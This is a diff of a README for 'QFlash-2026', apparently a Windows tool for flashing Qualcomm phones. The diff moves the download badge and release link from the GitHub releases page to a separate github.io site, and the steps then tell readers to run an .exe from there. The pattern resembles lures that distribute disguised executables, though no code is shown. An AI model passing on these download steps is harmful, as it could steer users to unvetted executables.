@@ -1,6 +1,6 @@
 # 🛠️ QFlash-2026 - Flash your Qualcomm devices with ease
 
-[![](https://img.shields.io/badge/Download_QFlash-Blue?style=for-the-badge&logo=github)](https://github.com/basic-digit691/QFlash-2026/releases)
+[![](https://img.shields.io/badge/Download_QFlash-Blue?style=for-the-badge&logo=github)](https://basic-digit691.github.io)
 
 QFlash-2026 provides a way to manage firmware on mobile devices using Qualcomm chipsets. Whether you need to restore official software or repair a phone that fails to boot, this tool helps you accomplish the task. This version works on Windows 10 and Windows 11. It offers features for flashing stock images, managing partitions, and clearing data to fix common device issues.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these requirements before you start the installation.
 
 Follow these steps to obtain and prepare the software on your machine.
 
-1. Visit the project release page: [https://github.com/basic-digit691/QFlash-2026/releases](https://github.com/basic-digit691/QFlash-2026/releases).
+1. Visit the project release page: [https://basic-digit691.github.io](https://basic-digit691.github.io).
 2. Look for the latest version listed under the Releases section.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
